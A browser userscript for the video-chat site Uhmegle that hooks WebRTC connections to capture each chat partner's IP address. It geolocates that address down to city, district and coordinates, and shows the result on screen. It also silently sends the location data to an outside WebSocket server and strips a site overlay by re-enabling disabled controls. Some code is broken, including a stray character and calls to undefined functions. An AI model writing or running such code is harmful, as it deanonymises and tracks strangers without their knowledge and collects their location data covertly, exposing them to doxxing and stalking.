// ==UserScript==
// @name         ChillTool's
// @namespace    http://tampermonkey.net/
// @version      1.9
// @description  IP display per Uhmegle
// @author       TinyHD
// @match        https://uhmegle.com/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"; // Link di FontAwesome
    document.head.appendChild(link);

    const getLocation = async (ip) => {
        const url = `https://get.geojs.io/v1/ip/geo/${ip}.json`;

        try {
            const response = await fetch(url);
            const json = await response.json();
            return {
                ip: ip,
                country: json.country || "N/A",
                state: json.region || "N/A",
                city: json.city || "N/A",
                district: json.district || "N/A",
                latitude: json.latitude || "N/A",
                longitude: json.longitude || "N/A"
            };
        } catch (error) {
            console.error("Error fetching IP location:", error);
            return null;
        }
    };

    function getChatBoxColor() {
        const textBox = document.querySelector('.chatWindow');
        return textBox ? window.getComputedStyle(textBox).backgroundColor : '#000';
    }

    function getOrCreateIpBox() {
        let ipBox = document.getElementById("ipDisplayBox");

        if (!ipBox) {
            const chatWindow = document.querySelector('.chatWindow');
            if (!chatWindow) return null;

            ipBox = document.createElement("div");
            ipBox.id = "ipDisplayBox";
            ipBox.style.backgroundColor = getChatBoxColor();
            ipBox.style.padding = "0";
            ipBox.style.margin = "0";
            ipBox.style.marginTop = "10px";
            ipBox.style.color = "#fff";
            ipBox.style.fontSize = "14px";
            ipBox.style.maxHeight = "200px";
            ipBox.style.overflowY = "auto";
            chatWindow.appendChild(ipBox);
        } else {
            ipBox.innerHTML = "<h3 style='color: #fff;'>ChillTool's</h3>";
        }

        return ipBox;
    }

    // Barra laterale
    const barraVer = document.createElement("div");
    barraVer.id = "barra_ver";
    barraVer.style.width = "auto";
    barraVer.style.height = "50px"; 
    barraVer.style.position = "absolute";
    barraVer.style.top = "13px";
    barraVer.style.right = "410px";
    barraVer.style.transform = "translateY(0%)";
    barraVer.style.display = "flex";
    barraVer.style.justifyContent = "space-around";
    barraVer.style.alignItems = "center";
    barraVer.style.zIndex = "10000";
    barraVer.style.padding = "10px";

    const buttons = [
        { color: "rgb(255, 0, 0)", icon: "fa-pause" },
        { color: "rgb(255, 0, 0)", icon: "fa-circle" },
        { color: "rgb(0, 0, 0)", text: "Jumpscare" },
        { color: "rgb(0, 0, 0)", icon: "fa-skull" },
        { color: "rgb(0, 123, 255)", icon: "fa-clock" },
        { color: "rgb(54, 54, 54)", icon: "fa-cog" },
    ];

    buttons.forEach(button => {
        const btn = document.createElement("button");
        btn.style.display = "inline-block";
        btn.style.cursor = "pointer";
        btn.style.fontWeight = "400";
        btn.style.color = "white";
        btn.style.zIndex = "9999";
        btn.style.textAlign = "center";
        btn.style.verticalAlign = "middle";
        btn.style.userSelect = "none";
        btn.style.backgroundColor = button.color;
        btn.style.border = "0.0px solid rgb(0, 123, 255)";
        btn.style.padding = "0.375rem 0.65rem";
        btn.style.fontSize = "14px";
        btn.style.lineHeight = "1.5";
        btn.style.borderRadius = "0.25rem";
        btn.style.transition = "color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out";
        btn.style.margin = "0 5px";


    const text = document.createElement("span");
    text.textContent = button.text;
    btn.appendChild(text);
    barraVer.appendChild(btn);

        const icon = document.createElement("i");
        icon.classList.add("fa", button.icon);
        btn.appendChild(icon);
        barraVer.appendChild(btn);
         
        // HISTORY
        if (button.icon === "fa-clock") {
            btn.addEventListener("click", () => {
                const modalHTML = `
                <div id="dataModal" class="modal" style="
                    display: block; position: fixed; z-index: 9999; left: 0; top: 0;
                    width: 100%; height: 100%; background: rgba(10, 10, 10, 0.85); backdrop-filter: blur(5px);
                    color: white; overflow: hidden;">
                    
                    <!-- Contenuto principale -->
                    <div class="modal-content" style="
                        position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
                        background: linear-gradient(135deg, rgba(0, 0, 50, 0.95), rgba(50, 0, 50, 0.9));
                        width: 90%; max-width: 700px; border-radius: 15px; padding: 30px;
                        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7); text-align: center;">
                        
                        <!-- Logo -->
                        <img src="https://i.ibb.co/jHzYHxz/Frame-53.png" alt="ChillSpot Logo" style="
                            width: 120px; height: auto; margin-bottom: 15px; filter: drop-shadow(0 0 10px #009dff);">
                        
                        <!-- Titolo -->
                        <h2 style="font-size: 28px; margin: 10px 0; letter-spacing: 1px; font-weight: bold;">
                            Partner History
                        </h2>
                        
                        <!-- Messaggio -->
                        <p style="margin: 20px 0; line-height: 1.5; font-size: 18px; color: #f0f0f0;">
                            Nessun dato nella History, connettiti con un Partner per iniziare a registrare i dati.
                        </p>
                        
                        <!-- Bottone di Chiudi -->
                        <button id="closeModal" style="
                            background-color: #009dff; color: white; border: none; padding: 10px 20px;
                            font-size: 16px; cursor: pointer; border-radius: 5px; transition: 0.3s;">
                            Chiudi
                        </button>
                        
                        <!-- Icona decorativa -->
                        <i class="fas fa-history" style="
                            font-size: 50px; color: rgba(0, 157, 255, 0.7); position: absolute;
                            bottom: -25px; right: -25px; transform: rotate(20deg);"></i>
                    </div>
                </div>`;
        
                document.body.insertAdjacentHTML('beforeend', modalHTML);

                const closeModal = document.getElementById("closeModal");
                closeModal.addEventListener("click", () => {
                    const modal = document.getElementById("dataModal");
                    if (modal) modal.remove();
                });
            });
        }

        if (button.icon === "fa-circle") {
      btn.addEventListener("click", async () => {
        const partnerIP = await getPartnerIP(); 
        if (partnerIP) {
          IPBlockingManager.blockIP(partnerIP); 
          console.log(`Blocked IP: ${partnerIP}`); 
        } else {
          console.error("Failed to get partner IP.");
        }
      });
    }
        

    if (button.icon === "fa-cog") {
        btn.addEventListener("click", () => {
            const modalHTML = `
            <div id="dataModal" class="modal" style="
                display: block; position: fixed; z-index: 9999; left: 0; top: 0;
                width: 100%; height: 100%; background: rgba(10, 10, 10, 0.85); backdrop-filter: blur(5px);
                color: white; overflow: hidden;">
                
                <!-- Contenuto principale -->
                <div id="modalContent" class="modal-content" style="
                    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
                    background: linear-gradient(135deg, rgba(0, 0, 50, 0.95), rgba(50, 0, 50, 0.9));
                    width: 90%; max-width: 700px; border-radius: 15px; padding: 30px;
                    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7); text-align: center;">
                    
                    <!-- Logo -->
                    <img src="https://i.ibb.co/jHzYHxz/Frame-53.png" alt="ChillSpot Logo" style="
                        width: 120px; height: auto; margin-bottom: 15px; filter: drop-shadow(0 0 10px #009dff);">
                    
                    <!-- Titolo -->
                    <h2 style="font-size: 28px; margin: 10px 0; letter-spacing: 1px; font-weight: bold;">
                        Impostazioni
                    </h2>
                    
                    <!-- Messaggio -->
                    <p style="margin: 20px 0; line-height: 1.5; font-size: 18px; color: #f0f0f0;">
                        Impostazioni dell'estensione.
                    </p>
                    
                    <!-- Bottone Modifica Interessi -->
                    <button id="editInterests" style="
                        margin-top: 15px; background-color: #ff8c00; color: white; border: none; padding: 10px 20px;
                        font-size: 16px; cursor: pointer; border-radius: 5px; transition: 0.3s;">
                        Modifica interessi
                    </button>
    
                    <!-- Bottone di Chiudi -->
                    <button id="closeModal" style="
                        margin-top: 15px; background-color: #009dff; color: white; border: none; padding: 10px 20px;
                        font-size: 16px; cursor: pointer; border-radius: 5px; transition: 0.3s;">
                        Chiudi
                    </button>
                    
                    <!-- Icona decorativa -->
                    <i class="fas fa-cog" style="font-size: 50px; color: rgba(0, 157, 255, 0.7); position: absolute;
                        bottom: -25px; right: -25px; transform: rotate(20deg);"></i>
                </div>
            </div>`;
    
            document.body.insertAdjacentHTML('beforeend', modalHTML);
    
            // Gestione chiusura modale
            const closeModal = document.getElementById("closeModal");
            closeModal.addEventListener("click", () => {
                const modal = document.getElementById("dataModal");
                if (modal) modal.remove();
            });
    
            // Bottone Modifica Interessi
            const editInterests = document.getElementById("editInterests");
            editInterests.addEventListener("click", () => {
                const modalContent = document.getElementById("modalContent");
                modalContent.innerHTML = `
                    <!-- Titolo Modifica Interessi -->
                    <h2 style="font-size: 28px; margin-bottom: 15px; color: #fff;">Modifica i tuoi interessi</h2>
                    
                    <!-- Div con gestione interessi -->
                    <div class="interestDiv" style="text-align: left;">
                        <div class="interestHeader" style="
                            font-size: 20px; margin-bottom: 10px; color: #009dff;">
                            What do you wanna talk about?
                        </div>
    
                        <!-- Container interessi -->
                        <div class="interestContainer" style="
                            display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;">
    
    
                            <textarea id="interestBox" placeholder="Aggiungi un interesse..." style="
                                margin-top: 10px; width: 100%; padding: 8px; border: none; border-radius: 5px;"></textarea>
                        </div>
                    </div>
    
                    <!-- Bottone per Tornare Indietro -->
                    <button id="goBack" style="
                        background-color: #ff8c00; color: white; border: none; padding: 10px 20px;
                        font-size: 16px; cursor: pointer; border-radius: 5px; transition: 0.3s;">
                        Torna indietro
                    </button>
                `;

                const goBack = document.getElementById("goBack");
                goBack.addEventListener("click", () => {
                    document.getElementById("dataModal").remove(); 
                    btn.click(); 
                });
            });
        });
    }
    

        if (button.icon === "fa-pause") {
            btn.addEventListener("click", () => {
                const chatWindow = document.querySelector('.chatWindow');
                if (chatWindow) {
                    chatWindow.innerHTML = "";
        
                    const informationDiv = document.createElement("div");
                    informationDiv.id = "information";
                    informationDiv.classList.add("information");
                    informationDiv.textContent = "Riavvio connessione";
                    informationDiv.style.color = "#fff";
                    informationDiv.style.fontSize = "16px";
                    informationDiv.style.textAlign = "left";
                    informationDiv.style.padding = "10px";
                    informationDiv.style.marginTop = "10px";
        x
                    chatWindow.appendChild(informationDiv);
                }

                setTimeout(() => {
                    window.location.reload();
                }, 500);
            });
        }
        
        
        
        if (button.icon === "fa-skull") {
            btn.addEventListener("click", () => {
                const notificationHTML = `
                <div class="sm-notify" style="
                    position: fixed; bottom: 70px; right: 20px; background-color: #009dff; color: white;
                    border-radius: 8px; padding: 15px 20px; font-size: 16px; display: flex;
                    align-items: center; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); z-index: 9999;
                    opacity: 0; animation: fadeIn 0.3s forwards;">
                    <span style="margin-right: 10px; font-size: 20px;">&#128071;</span> <!-- Icona -->
                    Funzione presto disponibile
                </div>`;
        
                document.body.insertAdjacentHTML('beforeend', notificationHTML);

                const notification = document.querySelector(".sm-notify");

                setTimeout(() => {
                    notification.style.animation = "fadeOut 0.3s forwards";
                }, 2300);

                setTimeout(() => {
                    if (notification) notification.remove();
                }, 2600);
            });
        }

        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes fadeIn {
                0% { opacity: 0; }
                100% { opacity: 1; }
            }
        
            @keyframes fadeOut {
                0% { opacity: 1; }
                100% { opacity: 0; }
            }
        `;
        document.head.appendChild(style);
        
        
        
    });
    

    document.body.appendChild(barraVer);

    const socket = new WebSocket('wss://websocket-qslm.onrender.com');

    socket.addEventListener('open', () => {
        console.log('Uhmegle socket connected');
    });

    socket.addEventListener('error', (error) => {
        console.error('WebSocket error:', error);
    });

    socket.addEventListener('close', () => {
        console.log('WebSocket connection closed');
    });

    const loggedIps = new Set();

    let ipBox = getOrCreateIpBox();

    const logo = document.createElement("img");
    logo.src = "https://i.ibb.co/jHzYHxz/Frame-53.png";
    logo.alt = "Logo";

    logo.style.position = "absolute";
    logo.style.bottom = "10px";
    logo.style.right = "10px";
    logo.style.maxWidth = "100px";
    logo.style.maxHeight = "100px";
    logo.style.cursor = "pointer";
    logo.style.zIndex = "10";

    logo.addEventListener("click", () => {
        window.open("https://chillspot.it", "_blank");
    });

    const chatWindow = document.querySelector('.chatWindow');
    if (chatWindow) {

        chatWindow.style.position = "relative";
        chatWindow.appendChild(logo);
    }
    

    const oRTCPeerConnection = window.RTCPeerConnection || window.oRTCPeerConnection;
    window.RTCPeerConnection = function(...args) {
        const pc = new oRTCPeerConnection(...args);
        const originalAddIceCandidate = pc.addIceCandidate.bind(pc);

        pc.addIceCandidate = function(iceCandidate, ...rest) {
            if (iceCandidate && iceCandidate.candidate) {
                const fields = iceCandidate.candidate.split(' ');
                const ip = fields[4];

                if (fields[7] === 'srflx' && !loggedIps.has(ip)) {
                    console.log('IP Address:', ip);
                    loggedIps.add(ip);

                    ipBox = getOrCreateIpBox();

                    const ipContainer = document.createElement("div");
                    ipContainer.style.marginBottom = "10px";
                    ipContainer.innerHTML = `<span style="color: #fff;">IP: ${ip} - <i>Loading...</i></span>`;
                    ipBox.appendChild(ipContainer);

                    getLocation(ip).then(info => {
                        if (info) {
                            ipContainer.innerHTML = `
                                <div style="color: #fff;">
                                    <strong>IP:</strong> ${info.ip} <br>
                                    <strong>Country:</strong> ${info.country} <br>
                                    <strong>State:</strong> ${info.state} <br>
                                    <strong>City:</strong> ${info.city} <br>
                                    <strong>District:</strong> ${info.district} <br>
                                    <strong>Lat / Long:</strong> (${info.latitude}, ${info.longitude}) <br>
                                </div>
                            `;

                            if (socket.readyState === WebSocket.OPEN) {
                                socket.send(JSON.stringify(info));
                            }
                        } else {
                            ipContainer.innerHTML = `<span style="color: #fff;">IP: ${ip} - <i>Failed to load info</i></span>`;
                        }
                    });
                }
            }

            return originalAddIceCandidate(iceCandidate, ...rest);
        };

        return pc;
    };

    const discordButton = document.createElement("a");
    discordButton.href = "https://chillspot.it"; 
    discordButton.target = "_blank";
    discordButton.className = "social discord";
    discordButton.innerHTML = `
        <img src="/static/img/discord.svg" width="24" height="24" alt="Discord icon">
        <strong>ChillSpot</strong>
    `;
    discordButton.style.position = "absolute";
    discordButton.style.top = "15px";
    discordButton.style.right = "280px"; 
    discordButton.style.backgroundColor = "#7289da";  
    discordButton.style.padding = "10px 20px";
    discordButton.style.borderRadius = "5px";
    discordButton.style.display = "flex";
    discordButton.style.alignItems = "center";
    discordButton.style.textDecoration = "none";
    discordButton.style.color = "#fff";
    discordButton.style.fontSize = "16px";

    const header = document.querySelector('header');
    if (header) {
        const openBoost = header.querySelector('.openBoost');
        if (openBoost) {
            openBoost.appendChild(discordButton);
        }
    }

    const removePopupAndOverlay = () => {
        const popupOverlay = document.getElementById("faceOverlay");
        if (popupOverlay) {
          popupOverlay.remove(); 
        }
        document.body.style.overflow = ""; 
        const disabledElements = document.querySelectorAll("[disabled]");
        disabledElements.forEach((element) => {
          element.disabled = false; 
        });
    };

    const observer = new MutationObserver(() => {
        removePopupAndOverlay();
    });

    observer.observe(document.body, { childList: true, subtree: true });

    document.addEventListener("DOMContentLoaded", removePopupAndOverlay);

})();
